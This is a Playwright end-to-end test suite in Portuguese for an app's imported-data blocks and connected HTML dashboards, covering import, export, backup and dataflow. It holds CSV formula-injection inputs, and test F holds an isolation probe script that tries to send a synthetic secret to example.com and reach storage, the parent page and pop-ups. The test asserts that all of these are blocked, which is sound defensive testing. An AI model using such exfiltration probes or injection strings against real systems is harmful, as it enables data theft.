/**
 * Issue #24 — Data Hub, D2-A: bloco “Dados importados” (`aurora.dataset`). Dados SINTÉTICOS.
 * Jornadas: importar CSV/JSON com prévia → persistir após recarregar → exportar CSV/JSON e reimportar →
 * recusar arquivo malformado sem estado parcial → alimentar uma Fórmula → backup pergunta sobre os dados.
 */
import { readFile } from 'node:fs/promises';
import { expect, test, type Page } from '@playwright/test';
import { ready, state, waitSaved } from './helpers';

const CSV = 'produto,região,valor,obs\r\nCafé ☕,Sul,10.5,"aspas ""duplas"""\r\n"Pão, francês",Norte,3,=1+1\r\nBolo,Sul,7,@SOMA(A1)\r\n';

async function addDataset(page: Page): Promise<string> {
  await page.evaluate(() => (window as any).__aurora.actions.createBoard('Data Hub E2E'));
  await expect.poll(async () => (await state(page)).elements.length).toBe(0);
  return page.evaluate(() => {
    const { actions } = (window as any).__aurora;
    const el = actions.addWidget('aurora.dataset', { x: 0, y: 0 });
    actions.setSelection([]);
    return el.id as string;
  });
}

async function importFile(page: Page, button: ReturnType<Page['getByTestId']>, file: { name: string; mimeType: string; text: string }) {
  const chooser = page.waitForEvent('filechooser');
  await button.click();
  await (await chooser).setFiles({ name: file.name, mimeType: file.mimeType, buffer: Buffer.from(file.text, 'utf8') });
}

const datasetData = async (page: Page, id: string) => (await state(page)).elements.find((e) => e.id === id)?.data;

test.describe('Issue #24 — Data Hub (D2-A)', () => {
  test('A: importa CSV com prévia, persiste após recarregar e exporta CSV seguro e JSON reimportáveis', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'vendas.csv', mimeType: 'text/csv', text: CSV });

    // Prévia antes de gravar: nada no bloco ainda.
    const dialog = page.getByRole('dialog');
    await expect(dialog.getByTestId('dataset-preview-counts')).toHaveText('3 linha(s) × 4 coluna(s)');
    await expect(dialog.getByTestId('dataset-preview-table')).toContainText('Café ☕');
    expect((await datasetData(page, id)).source).toBeNull();
    await dialog.getByRole('button', { name: 'Importar', exact: true }).click();

    await expect(page.getByTestId('dataset-counts')).toHaveText('3 linha(s) × 4 coluna(s)');
    await expect(page.getByTestId('dataset-table')).toContainText('Pão, francês');
    const d = await datasetData(page, id);
    expect(d.source).toMatchObject({ name: 'vendas', kind: 'csv', rows: 3, columns: 4 });
    // O quadro guarda só a referência: nenhuma célula no JSON do bloco.
    expect(JSON.stringify(d)).not.toContain('Café');
    expect((await state(page)).elements.find((e) => e.id === id)?.title).toBe('vendas');

    await waitSaved(page);
    await page.reload();
    await page.waitForFunction(() => (window as any).__aurora?.getState().status === 'ready');
    await expect(page.getByTestId('dataset-counts')).toHaveText('3 linha(s) × 4 coluna(s)');
    await expect(page.getByTestId('dataset-table')).toContainText('Café ☕');

    // Exportar CSV: Unicode, aspas e fórmulas neutralizadas.
    const dl = page.waitForEvent('download');
    await page.getByTestId('dataset-export-csv').click();
    const csvFile = await dl;
    expect(csvFile.suggestedFilename()).toBe('vendas.csv');
    const out = await readFile((await csvFile.path())!, 'utf8');
    expect(out.charCodeAt(0)).toBe(0xfeff);
    expect(out).toContain('Café ☕');
    expect(out).toContain('"aspas ""duplas"""');
    expect(out).toContain(`"'=1+1"`);
    expect(out).toContain(`"'@SOMA(A1)"`);

    // Exportar JSON e reimportar (substituir) mantém contagens e Unicode.
    const dl2 = page.waitForEvent('download');
    await page.getByTestId('dataset-export-json').click();
    const jsonText = await readFile((await (await dl2).path())!, 'utf8');
    expect(JSON.parse(jsonText).rows[0][0]).toBe('Café ☕');
    await importFile(page, page.getByTestId('dataset-replace'), { name: 'vendas.json', mimeType: 'application/json', text: jsonText });
    await expect(page.getByRole('dialog').getByTestId('dataset-replace-note')).toBeVisible();
    await page.getByRole('dialog').getByRole('button', { name: 'Substituir', exact: true }).click();
    // A substituição grava o asset e só então troca a referência (assíncrono); contagens e conteúdo são iguais aos
    // do CSV, então espera a TROCA de fato antes de conferir a tela (corrida vista na CI do PR #27).
    await expect.poll(async () => (await datasetData(page, id)).source.kind).toBe('json');
    await expect(page.getByTestId('dataset-counts')).toHaveText('3 linha(s) × 4 coluna(s)');
    await expect(page.getByTestId('dataset-table')).toContainText('=1+1');
  });

  test('B: arquivo malformado ou grande demais é recusado sem estado parcial', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'ruim.csv', mimeType: 'text/csv', text: 'a,b,c\n1,2,3\n4,5\n' });
    await expect(page.getByRole('dialog')).toContainText('Importação recusada');
    await expect(page.getByRole('dialog')).toContainText('Linha 3');
    await expect(page.getByRole('dialog')).toContainText('Nenhum dado foi alterado');
    await page.getByRole('dialog').getByRole('button', { name: 'Ok' }).click();
    expect((await datasetData(page, id)).source).toBeNull();

    await importFile(page, page.getByTestId('dataset-import'), { name: 'grande.json', mimeType: 'application/json', text: '[' + '{"a":1},'.repeat(3_500_000) + '{"a":1}]' });
    await expect(page.getByRole('dialog')).toContainText('grande demais');
    await page.getByRole('dialog').getByRole('button', { name: 'Ok' }).click();

    // Cancelar a prévia também não grava nada.
    await importFile(page, page.getByTestId('dataset-import'), { name: 'ok.json', mimeType: 'application/json', text: '[{"a":1}]' });
    await page.getByRole('dialog').getByRole('button', { name: 'Cancelar' }).click();
    expect((await datasetData(page, id)).source).toBeNull();
    await expect(page.getByTestId('dataset-empty')).toBeVisible();
  });

  test('C: Dados → Fórmula pela conexão de dados; backup do quadro pergunta antes de incluir os dados', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'n.csv', mimeType: 'text/csv', text: 'v\n1\n2\n3\n4\n' });
    await page.getByRole('dialog').getByRole('button', { name: 'Importar', exact: true }).click();
    await expect(page.getByTestId('dataset-counts')).toHaveText('4 linha(s) × 1 coluna(s)');

    const formula = await page.evaluate((dsId) => {
      const { actions, elements: E } = (window as any).__aurora;
      const f = actions.addWidget('aurora.formula', { x: 700, y: 0 }, { expression: '=linhas * 10' }, { title: 'Total' });
      const l = E.createLinear('arrow', 0, 0, [[0, 0], [1, 1]], {}, 'data');
      l.startBinding = { elementId: dsId, fixedPoint: null };
      l.endBinding = { elementId: f.id, fixedPoint: null };
      l.connection = { ...l.connection, sourcePort: 'count', targetPort: 'in', variable: 'linhas' };
      actions.addElements([l], false);
      actions.setSelection([]);
      return f.id as string;
    }, id);
    await expect.poll(() => page.evaluate((fid) => {
      const w = (window as any).__aurora;
      const out = w.core.getDataflow(w.getState().elements).outputs.get(fid)?.result;
      return out ? out.v : null;
    }, formula)).toBe('40');

    // Exportar o quadro: a decisão sobre os dados importados é explícita.
    await page.getByRole('button', { name: /Exportar/ }).click();
    await page.getByRole('menuitem', { name: /Este quadro/ }).click();
    await expect(page.getByRole('dialog')).toContainText('Incluir dados importados?');
    const dl = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Sem os dados' }).click();
    const text = await readFile((await (await dl).path())!, 'utf8');
    const file = JSON.parse(text);
    expect(file.assets.filter((a: { mimeType: string }) => a.mimeType === 'application/vnd.aurora.dataset+json')).toHaveLength(0);

    await page.getByRole('button', { name: /Exportar/ }).click();
    await page.getByRole('menuitem', { name: /Este quadro/ }).click();
    const dl2 = page.waitForEvent('download');
    await page.getByRole('dialog').getByRole('button', { name: 'Incluir dados' }).click();
    const file2 = JSON.parse(await readFile((await (await dl2).path())!, 'utf8'));
    expect(file2.assets.filter((a: { mimeType: string }) => a.mimeType === 'application/vnd.aurora.dataset+json')).toHaveLength(1);
  });

  // Revisão do Codex (PR #27): restaurar, na mesma sessão, um backup SEM os dados e depois outro COM os dados
  // deixava o bloco “ausente” até recarregar a página (cache negativo).
  test('D: outro dispositivo — backup sem os dados mostra “ausente”; o backup com os dados restaura sem recarregar', async ({ page, browser }) => {
    await ready(page);
    await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'pais.csv', mimeType: 'text/csv', text: 'país,capital\nBrasil,Brasília\nPortugal,Lisboa\n' });
    await page.getByRole('dialog').getByRole('button', { name: 'Importar', exact: true }).click();
    await expect(page.getByTestId('dataset-counts')).toHaveText('2 linha(s) × 2 coluna(s)');
    const exportBoard = async (choice: 'Sem os dados' | 'Incluir dados') => {
      await page.getByRole('button', { name: /Exportar/ }).click();
      await page.getByRole('menuitem', { name: /Este quadro/ }).click();
      const dl = page.waitForEvent('download');
      await page.getByRole('dialog').getByRole('button', { name: choice }).click();
      return readFile((await (await dl).path())!, 'utf8');
    };
    const without = await exportBoard('Sem os dados');
    const withData = await exportBoard('Incluir dados');

    // “Outro dispositivo”: contexto novo, IndexedDB vazio.
    const ctx = await browser.newContext();
    const other = await ctx.newPage();
    await ready(other);
    const importBackup = async (name: string, text: string) => {
      await other.getByRole('button', { name: 'Importar', exact: true }).click();
      const chooser = other.waitForEvent('filechooser');
      await other.getByRole('menuitem', { name: /Arquivo JSON/ }).click();
      await (await chooser).setFiles({ name, mimeType: 'application/json', buffer: Buffer.from(text, 'utf8') });
      await other.getByRole('button', { name: 'Importar como novos quadros' }).click();
    };
    await importBackup('sem-dados.aurora.json', without);
    await expect(other.getByTestId('dataset-status')).toHaveAttribute('data-status', 'missing');
    await importBackup('com-dados.aurora.json', withData);
    await expect(other.getByTestId('dataset-counts')).toHaveText('2 linha(s) × 2 coluna(s)');
    await expect(other.getByTestId('dataset-table')).toContainText('Brasília');
    await ctx.close();
  });
});

/* ------------------------------------------------------------------ D2-B — dashboards HTML conectados */

const VENDAS = 'produto,região,valor\nCafé,Sul,10\nPão,Norte,3\nBolo,Sul,7\nSuco,Norte,5\n';
const dash = (page: Page) => page.frameLocator('iframe[sandbox]').first();

test.describe('Issue #24 — Data Hub (D2-B): dashboard HTML conectado', () => {
  test('E: “Criar painel HTML conectado” → KPIs, filtro e gráfico; HTML → Fórmula; substituir os dados atualiza sem recarregar o iframe', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'vendas.csv', mimeType: 'text/csv', text: VENDAS });
    await page.getByRole('dialog').getByRole('button', { name: 'Importar', exact: true }).click();
    await expect(page.getByTestId('dataset-counts')).toHaveText('4 linha(s) × 3 coluna(s)');

    // Painel do bloco: agrupamento nativo e criação do dashboard.
    await page.evaluate((x) => (window as any).__aurora.actions.setSelection([x]), id);
    await page.getByTestId('dataset-group-by').selectOption('região');
    await page.getByTestId('dataset-measure').selectOption('valor');
    await expect(page.getByTestId('dataset-groups-info')).toContainText('2 grupo(s)');
    await page.getByTestId('dataset-create-dashboard').click();
    const htmlId = await page.evaluate(() => (window as any).__aurora.getState().elements.find((e: any) => e.widgetType === 'aurora.sandbox-html').id as string);

    await expect(dash(page).locator('#kTotal')).toHaveText('4');
    await expect(dash(page).locator('#kSoma')).toHaveText('25');
    await expect(dash(page).locator('#legenda')).toContainText('conjunto inteiro');
    await expect(dash(page).locator('#corpo tr')).toHaveCount(4);
    await expect(dash(page).locator('#grafico rect')).toHaveCount(2);

    // HTML publica a soma → Fórmula.
    const fid = await page.evaluate((h) => {
      const { actions, elements: E } = (window as any).__aurora;
      const f = actions.addWidget('aurora.formula', { x: 1300, y: 0 }, { expression: '=total * 2' }, { title: 'Dobro' });
      const l = E.createLinear('arrow', 0, 0, [[0, 0], [1, 1]], {}, 'data');
      l.startBinding = { elementId: h, fixedPoint: null };
      l.endBinding = { elementId: f.id, fixedPoint: null };
      l.connection = { ...l.connection, sourcePort: 'total', targetPort: 'in', variable: 'total' };
      actions.addElements([l], false);
      actions.setSelection([]);
      return f.id as string;
    }, htmlId);
    const formula = () => page.evaluate((x) => { const a = (window as any).__aurora; return a.core.getDataflow(a.getState().elements).outputs.get(x)?.result?.v ?? null; }, fid);
    await expect.poll(formula).toBe('50');

    // Filtro dentro do iframe (preferência salva no estado do HTML, nunca as linhas).
    await dash(page).locator('#sColuna').selectOption('região');
    await dash(page).locator('#sValor').selectOption('Sul');
    await expect(dash(page).locator('#kFiltradas')).toHaveText('2');
    await expect(dash(page).locator('#kSoma')).toHaveText('17');
    await expect.poll(formula).toBe('34');
    await expect.poll(() => page.evaluate((h) => (window as any).__aurora.getState().elements.find((e: any) => e.id === h).data.state, htmlId)).toEqual({ medida: 'valor', coluna: 'região', valor: 'Sul' });

    // Substituir os dados: o painel recalcula SEM recarregar o iframe (o mesmo elemento continua na página).
    await page.locator('iframe[sandbox]').first().evaluate((el) => { (el as HTMLElement).dataset.marca = 'antes'; });
    await page.evaluate((x) => (window as any).__aurora.actions.setSelection([x]), id);
    await importFile(page, page.getByTestId('dataset-inspector-import'), { name: 'vendas2.csv', mimeType: 'text/csv', text: 'produto,região,valor\nCafé,Sul,100\nPão,Norte,3\nBolo,Sul,50\n' });
    await page.getByRole('dialog').getByRole('button', { name: 'Substituir', exact: true }).click();
    await expect(dash(page).locator('#kSoma')).toHaveText('150');
    await expect.poll(formula).toBe('300');
    await expect(page.locator('iframe[sandbox]').first()).toHaveAttribute('data-marca', 'antes');
  });

  // Revisão do Codex (PR #28): o gráfico sem agrupamento ignorava o filtro; a média antiga continuava publicada sem
  // valores; o seletor mostrava “(todos)” com um filtro ainda valendo.
  test('G: painel sem agrupamento — gráfico com o filtro, média sem valores = 0, filtro sempre visível ou limpo', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 'vendas.csv', mimeType: 'text/csv', text: VENDAS });
    await page.getByRole('dialog').getByRole('button', { name: 'Importar', exact: true }).click();
    await page.evaluate((x) => (window as any).__aurora.actions.setSelection([x]), id);
    await page.getByTestId('dataset-create-dashboard').click();
    const htmlId = await page.evaluate(() => (window as any).__aurora.getState().elements.find((e: any) => e.widgetType === 'aurora.sandbox-html').id as string);
    const out = (port: string) => page.evaluate(([h, p]) => { const a = (window as any).__aurora; const v = a.core.getDataflow(a.getState().elements).outputs.get(h)?.[p]; return v && typeof v === 'object' && 'v' in v ? v.v : v ?? null; }, [htmlId, port] as const);

    await dash(page).locator('#sColuna').selectOption('região');
    await expect(dash(page).locator('#grafico rect')).toHaveCount(2); // Sul e Norte
    await dash(page).locator('#sValor').selectOption('Sul');
    await expect(dash(page).locator('#grafico rect')).toHaveCount(1); // só o grupo filtrado
    await expect.poll(() => out('media')).toBe('8.5');

    const replace = async (name: string, text: string) => {
      await page.evaluate((x) => (window as any).__aurora.actions.setSelection([x]), id);
      await importFile(page, page.getByTestId('dataset-inspector-import'), { name, mimeType: 'text/csv', text });
      await page.getByRole('dialog').getByRole('button', { name: 'Substituir', exact: true }).click();
    };
    // Sul sem números: a média publicada vira 0 (com “valores” = 0), não fica a antiga.
    await replace('v2.csv', 'produto,região,valor\nCafé,Sul,\nPão,Norte,3\n');
    await expect(dash(page).locator('#kMedia')).toHaveText('—');
    await expect.poll(() => out('media')).toBe('0');
    await expect.poll(() => out('valores')).toBe('0');
    // O valor filtrado some da página: continua visível no seletor (é o filtro que vale).
    await replace('v3.csv', 'produto,região,valor\nPão,Norte,3\n');
    await expect(dash(page).locator('#kFiltradas')).toHaveText('0');
    await expect(dash(page).locator('#sValor option:checked')).toHaveText('Sul (sem linhas aqui)');
    // A coluna do filtro deixa de existir: o filtro é limpo e a tela mostra “(sem filtro)”.
    await replace('v4.csv', 'produto,valor\nPão,3\n');
    await expect(dash(page).locator('#kFiltradas')).toHaveText('1');
    await expect(dash(page).locator('#sColuna option:checked')).toHaveText('(sem filtro)');
  });

  test('F: isolamento — HTML conectado a dados importados não tem rede, armazenamento, acesso ao app nem pop-ups', async ({ page }) => {
    await ready(page);
    const id = await addDataset(page);
    await importFile(page, page.getByTestId('dataset-import'), { name: 's.csv', mimeType: 'text/csv', text: 'segredo\nVALOR-SINTETICO\n' });
    await page.getByRole('dialog').getByRole('button', { name: 'Importar', exact: true }).click();
    await expect(page.getByTestId('dataset-counts')).toHaveText('1 linha(s) × 1 coluna(s)');
    const probe = `<script>
      aurora.onInputs(async (i) => {
        if (!Array.isArray(i.dados) || !i.dados.length) return;
        const r = { recebeu: i.dados[0].segredo };
        const tryIt = async (k, f) => { try { const v = await f(); r[k] = 'ok:' + String(v); } catch (e) { r[k] = 'bloqueado'; } };
        await tryIt('fetch', () => fetch('https://example.com/?d=' + encodeURIComponent(i.dados[0].segredo)).then((x) => x.status));
        await tryIt('indexedDB', () => new Promise((ok, no) => { const q = indexedDB.open('roubo'); q.onsuccess = () => ok('aberto'); q.onerror = () => no(q.error); }));
        await tryIt('localStorage', () => localStorage.getItem('x'));
        await tryIt('parent', () => parent.document.title);
        await tryIt('open', () => { const w = window.open('https://example.com'); if (!w) throw new Error('sem popup'); return 'janela'; });
        await tryIt('image', () => new Promise((ok, no) => { const im = new Image(); im.onload = () => ok('carregou'); im.onerror = () => no(new Error('x')); im.src = 'https://example.com/p.png?d=1'; }));
        aurora.publish('sonda', JSON.stringify(r));
      });
    </script>`;
    const hid = await page.evaluate(([ds, html]) => {
      const { actions, elements: E } = (window as any).__aurora;
      const h = actions.addWidget('aurora.sandbox-html', { x: 700, y: 0 }, { html, state: {}, bridge: { version: 1, inputs: [{ id: 'dados', label: 'Dados', type: 'object' }], outputs: [{ id: 'sonda', label: 'Sonda', type: 'text' }], ai: { mode: 'none', outputs: [], confirmedDigest: '', confirmedAt: 0 } } }, { title: 'Sonda' });
      const l = E.createLinear('arrow', 0, 0, [[0, 0], [1, 1]], {}, 'data');
      l.startBinding = { elementId: ds, fixedPoint: null };
      l.endBinding = { elementId: h.id, fixedPoint: null };
      l.connection = { ...l.connection, sourcePort: 'rows', targetPort: 'dados' };
      actions.addElements([l], false);
      actions.setSelection([]);
      return h.id as string;
    }, [id, probe] as const);
    const result = () => page.evaluate((h) => { const a = (window as any).__aurora; return a.core.getDataflow(a.getState().elements).outputs.get(h)?.sonda ?? null; }, hid);
    await expect.poll(result, { timeout: 15_000 }).not.toBeNull();
    const r = JSON.parse((await result()) as string);
    expect(r.recebeu).toBe('VALOR-SINTETICO');
    for (const k of ['fetch', 'indexedDB', 'localStorage', 'parent', 'open', 'image']) expect(r[k], k).toBe('bloqueado');
    await expect(page.locator('iframe[sandbox]').first()).toHaveAttribute('sandbox', 'allow-scripts');
  });
});
